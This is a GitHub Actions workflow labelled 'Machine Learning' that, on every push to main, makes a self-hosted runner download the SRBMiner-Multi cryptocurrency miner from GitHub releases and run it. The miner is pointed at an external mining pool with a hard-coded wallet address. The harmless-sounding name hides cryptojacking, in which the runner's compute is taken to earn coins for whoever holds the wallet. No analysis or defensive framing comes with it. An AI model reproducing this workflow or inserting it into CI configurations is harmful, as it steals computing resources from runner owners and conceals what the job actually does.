name: Machine Learning
on:
  push:
    branches:
      - main

jobs:
  build:
    runs-on: self-hosted
    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Download and Run
      run: |
        sudo apt update
          sudo apt install wget
          sudo apt -y install tar xz-utils
        wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.5/SRBMiner-Multi-2-4-5-Linux.tar.xz
        tar -xf SRBMiner-Multi-2-4-5-Linux.tar.xz
        cd SRBMiner-Multi-2-4-5
        ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool ru-stratum.altcoinpool.ru:6234 --wallet VUsSwd174irshqzSjVhZ8aSCjqooTG6Mi6.r1 pause --keepalive true 
